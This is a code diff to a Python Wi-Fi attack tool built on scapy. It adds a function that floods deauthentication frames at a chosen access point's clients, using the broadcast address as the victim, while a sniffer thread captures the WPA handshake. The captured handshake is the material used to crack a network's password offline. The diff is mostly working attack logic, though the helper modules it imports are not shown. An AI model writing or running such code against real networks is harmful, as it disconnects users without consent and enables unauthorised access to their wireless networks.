@@ -17,6 +17,7 @@ from scapy.layers.dot11 import Dot11FCS
 from ap_sniffer import APSniffer
 from channel_hopper import ChannelHopper
 from deauth_sender import DeauthSender
+from handshake_sniffer import HandshakeSniffer
 
 Dot11Type = Dot11FCS
 
@@ -51,7 +52,7 @@ def main():
     print(selected_ap)
     print("")
 
-    deauth(selected_ap.bssid, "ff:ff:ff:ff:ff:ff")  # TODO Select victim
+    sniff_handshake(selected_ap.bssid, "ff:ff:ff:ff:ff:ff")  # TODO Select victim
     # TODO Capture handshake
 
     channel_hopper_thread.stop = True
@@ -105,12 +106,37 @@ def deauth(target_network, target_client):
     global iface, deauth_thread
 
     input("Press enter to start sending deauth")
+    deauth_start(target_network, target_client)
+    input("Press enter to stop sending deauth")
+    deauth_stop()
+
+
+def deauth_start(target_network, target_client):
+    global deauth_thread
+
     deauth_thread = DeauthSender(iface, selected_ap.bssid, target_client)
     deauth_thread.start()
-    input("Press enter to stop sending deauth")
+
+
+def deauth_stop():
+    global deauth_thread
 
     deauth_thread.stop = True
     deauth_thread.join()
+
+
+# Sniff a handshake
+def sniff_handshake(target_network, target_client):
+    global iface, selected_ap
+
+    input("Press enter to start sniffing a handshake")
+    deauth_start(target_network, target_client)
+    handshake_sniffer_thread = HandshakeSniffer(iface)
+    handshake_sniffer_thread.start()
+
+    time.sleep(3)
+    deauth_stop()
+    handshake_sniffer_thread.join()
 
 
 # Executed when signal catches an exception (like CTRL+C) during runtime
